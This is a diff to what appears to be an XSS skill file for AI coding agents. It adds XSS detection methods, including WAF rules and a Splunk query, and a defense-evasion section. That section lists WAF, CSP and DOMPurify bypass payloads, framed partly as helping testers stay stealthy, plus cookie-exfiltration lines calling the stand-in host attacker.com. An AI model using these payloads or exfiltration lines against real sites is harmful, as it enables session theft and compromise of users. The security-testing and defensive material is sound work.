@@ -2,7 +2,7 @@
 name: web-xss
 description: "XSS (Cross-Site Scripting) is an attack that injects malicious scripts into trusted websites."
 origin: openclaw
-version: "0.1.18"
+version: "0.1.50"
 compatibility:
   - openclaw
   - claude-code
@@ -21,6 +21,7 @@ metadata:
   guide_count: 5
   owasp: "A03:2021-Injection"
   mitre: "T1189-Drive-by Compromise"
+  last_reviewed: "2026-07-19"
 ---
 
 
@@ -342,6 +343,73 @@ Modern JavaScript frameworks (React, Vue, Angular) provide built-in XSS protecti
 | Input Validation | Rejects malicious input | Encoding bypass, double encoding |
 | Output Encoding | Escapes special characters | Context mismatch, DOM-based XSS |
 | WAF | Pattern-based blocking | Obfuscation, encoding, fragmentation |
+
+---
+
+## Detection Methods
+
+Modern XSS detection combines signature-based WAF rules, behavioral analysis, and runtime protection (CSP/Trusted Types). Understanding detection signals helps testers operate more stealthily and helps defenders build robust monitoring.
+
+### Server-Side Indicators
+- **Reflected payload signatures**: WAF rules detect `<script>`, `onerror=`, `javascript:`, `<svg onload`, `<iframe srcdoc` patterns.
+- **Encoding anomalies**: Multiple URL-encoded characters (`%3C%73%63%72%69%70%74`), HTML entity encoding (`&#60;script&#62;`), Base64-encoded payloads in parameters.
+- **Parameter length outliers**: Query parameters exceeding typical length distributions (statistical anomaly detection).
+- **Cross-parameter injection**: Same payload across multiple parameters (automated scanner fingerprint).
+
+### Client-Side Indicators
+- **DOM mutation patterns**: Trusted Types violations logged in Console; CSP report-uri hits.
+- **Suspicious source locations**: Data flowing from `location.hash` / `document.referrer` directly into `innerHTML` / `document.write`.
+- **Framework escape hatches**: `dangerouslySetInnerHTML` / `v-html` / `{@html}` usage in code audit.
+- **Console errors**: Mutation XSS often produces parser-level warnings in browser console.
+
+### SIEM / WAF Detection Rules
+- **ModSecurity CRS**: Rule set `941100-942999` covers XSS patterns (OWASP Core Rule Set).
+- **Cloudflare**: Managed rule "Cloudflare XSS" blocks common patterns with machine learning augmentation.
+- **AWS WAF**: AWSManagedRulesCommonRuleSet includes XSS rule group (`AWSManagedRulesXSSRuleSet`).
+- **CSP Reporting**: `report-uri` / `report-to` headers deliver violation reports to SIEM for centralized analysis.
+- **Splunk SPL**: `index=waf sourcetype=cloudflare http.request.uri="*%3Cscript*"` detects encoded `<script>` attempts.
+
+### Runtime Defense Validation
+- **Trusted Types**: Chrome/Edge enforcement; requires `policy.createHTML(...)` instead of raw strings.
+- **CSP `script-src 'nonce-...' 'strict-dynamic'`**: Prevents inline execution without nonce.
+- **Sanitizer API**: Native browser sanitizer (Chrome 105+) as DOMPurify alternative.
+- **Subresource Integrity (SRI)**: Detects script tampering via integrity hash mismatch.
+
+## Defense Evasion Techniques
+
+### WAF Bypass
+- **Encoding obfuscation**: HTML entity (`&#x3c;script&#x3e;`), URL encoding (`%3Cscript%3E`), Unicode (`<script>`), Base64 (`PHNjcmlwdD4=`).
+- **Case variation**: `<ScRiPt>`, `<IMG SRC=x ONerror=alert(1)>`.
+- **Whitespace manipulation**: `<script\x09>`, `<script\x0a>`, `<script/>` (newline / tab / null byte separators).
+- **Tag breaking**: `<scr<script>ipt>` (filter removes inner `<script>` leaving `<script>`).
+- **Nested encoding**: Double-URL-encode (`%253Cscript%253E`) to bypass decode-once filters.
+- **Content-Type confusion**: Send payload as `multipart/form-data` or different charset (`charset=ibm037`).
+
+### CSP Bypass
+- **Script gadgets**: Angular (`{{$eval.constructor('alert(1)')()}}`), jQuery (`$.globalEval`), Prototype.js, Bootstrap (loadscript).
+- **JSONP endpoints**: Abuse legitimate callback parameters (`https://target.com/api/jsonp?callback=alert(1)//`).
+- **`unsafe-eval`**: Template literals, `Function()` constructor, `eval()` execution.
+- **`strict-dynamic` trust propagation**: Inject a trusted script tag that then loads malicious scripts.
+- **base-uri manipulation**: Override `<base href>` to redirect relative script loads.
+- **DNS prefetch exfil**: `<link rel="dns-prefetch" href="//data.attacker.com">` for blind data exfiltration.
+
+### DOM Sanitizer Bypass (mXSS)
+- **DOMPurify bypass via MathML**: `<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)>` (mXSS in older DOMPurify versions).
+- **HTML namespace confusion**: `<svg></p><style><a id="</style><img src=1 onerror=alert(1)>">`.
+- **Backtick attribute injection**: Bypass attribute filters via backtick-only syntax (legacy IE).
+- **Re-serialization**: Force sanitization output to be re-parsed by browser's HTML parser (different from server-side parser).
+
+### Filter Evasion
+- **Length reduction**: `<svg onload=alert(1)>` (shorter than `<script>...</script>`).
+- **Event handler alternatives**: `onpointerenter`, `onanimationstart`, `ontransitionend`, `ontoggle`, `onbeforetoggle`.
+- **SVG/MathML contexts**: `<svg><animate onbegin=alert(1)>`, `<math><maction actiontype=statusline#http://google.com xlink:href=javascript:alert(1)>`.
+- **HTML5 semantic tags**: `<details ontoggle=alert(1) open>`, `<marquee onstart=alert(1)>`.
+
+### Stealth Exfiltration
+- **DNS tunneling**: `<img src="//cookie-VALUE.attacker.com/x.png">` for blind cookie exfil.
+- **Cache poisoning**: Poison cached response so legitimate users trigger XSS on later visits.
+- **WebRTC leak**: Use RTCPeerConnection for IP/credential exfil (bypasses CSP `connect-src`).
+- **Service Worker persistence**: Register service worker for persistent XSS execution across sessions.
 
 ---
 
